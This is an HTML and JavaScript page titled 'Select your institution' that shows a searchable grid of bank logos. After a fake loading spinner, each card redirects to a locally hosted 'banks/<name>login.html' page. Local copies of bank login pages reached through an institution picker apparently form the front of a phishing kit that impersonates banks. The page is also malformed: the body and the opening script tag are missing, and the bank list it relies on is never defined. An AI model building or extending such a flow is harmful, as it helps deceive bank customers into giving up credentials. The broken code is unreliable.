<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<title>Select your institution</title>

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
background:#ffffff;
display:flex;
justify-content:center;
color:#1d1d1f;
}

.app{
width:100%;
max-width:430px;
min-height:100vh;
background:#ffffff;
display:flex;
flex-direction:column;
}

.header{
background:#ffffff;
padding:12px 18px 8px;
}

.topbar{
display:flex;
align-items:center;
justify-content:space-between;
margin-bottom:14px;
}

.icon-btn{
width:54px;height:22px;border:none;background:transparent;
display:flex;align-items:center;justify-content:center;
cursor:pointer;color:#2a2a2a
   
}

.icon-btn svg{
width:26px;height:26px;stroke:currentColor;stroke-width:2.2;
fill:none;stroke-linecap:round;stroke-linejoin:round
}

.brand img{height:28px}

.progress{
display:flex;
gap:10px;
padding:0 6px;
}

.bar{
flex:1;height:4px;border-radius:999px;background:#dce3e7;
position:relative;overflow:hidden
}

.bar.full::after{
content:"";position:absolute;inset:0;background:#30c8ea
}

.bar.half::after{
content:"";position:absolute;left:0;top:0;bottom:0;width:50%;
background:#30c8ea
}

.content{
flex:1;
overflow-y:auto;
padding:18px 20px 28px;
}

.title{
text-align:center;
font-size:22px;
font-weight:700;
margin:10px 0 15px;
margin-top: -4px;
}

.search-box {
      display: flex;
      align-items: center;
      gap: 10px;
      height: 48px;
      background: #fff;
      border: 0.5px solid #8b8b8b;
      border-radius: 14px;
      padding: 0 18px;
      margin-bottom: 18px;
    }

    .search-box svg {
      width: 22px;
      height: 22px;
      stroke: #444;
      stroke-width: 2;
      fill: none;
      flex-shrink: 0;
    }

    .search-input {
      width: 100%;
      border: none;
      outline: none;
      background: transparent;
      font-size: 18px;
      color: #222;
      font-family: inherit;
    }

    .search-input::placeholder {
      color: #7a7a7a;
    }


.bank-grid{
display:grid;
grid-template-columns:repeat(2,1fr);
gap:12px;
}

.bank-card{
height:64px;
border:1px solid #d9d9d9;
border-radius:10px;
background:#fff;
display:flex;
align-items:center;
justify-content:center;
padding:10px 14px;
cursor:pointer;
transition:0.15s;
position:relative;
}

.bank-card:hover{
transform:translateY(-1px);
box-shadow:0 4px 10px rgba(0,0,0,0.05);
}

.bank-card img{
max-width:78%;
max-height:42px;
object-fit:contain;
}

.bank-card.loading::before{
content:"";
width:22px;height:22px;
border:2px solid #d5d5d5;
border-top:2px solid #888;
border-radius:50%;
animation:spin 0.8s linear infinite;
position:absolute;
}

.bank-card.loading img{opacity:0}

.footer-links{
display:flex;
flex-direction:column;
align-items:center;
gap:28px;
padding:30px 0 12px;
}

.footer-links a{
text-decoration:none;
color:#2b2b2b;
font-size:17px;
font-weight:600;
}

@keyframes spin{
from{transform:rotate(0)}
to{transform:rotate(360deg)}
}
</style>
</head>

const bankGrid = document.getElementById("bankGrid")
const searchInput = document.getElementById("searchInput")

function formatSrc(base64){
  if(base64.startsWith("data:")) return base64
  return "data:image/png;base64," + base64
}

function renderBanks(list){

  bankGrid.innerHTML = ""

  list.forEach(bank => {

    const card = document.createElement("button")
    card.className = "bank-card"
    card.dataset.name = bank.name

    const img = document.createElement("img")
    img.src = formatSrc(bank.logo)

    card.appendChild(img)

    card.onclick = () => {

      card.classList.add("loading")

      setTimeout(() => {

        // convert bank name to filename
        const pageName = bank.name
          .toLowerCase()
          .replace(/&/g,"and")
          .replace(/[^a-z0-9]/g,"")

        // redirect to bank login page
        window.location.href = "banks/" + pageName + "login.html"

      }, 800)

    }

    bankGrid.appendChild(card)

  })

}

searchInput.addEventListener("input", function(){

  const value = this.value.toLowerCase()

  const filtered = banks.filter(b =>
    b.name.toLowerCase().includes(value)
  )

  renderBanks(filtered)

})

renderBanks(banks)
</script>
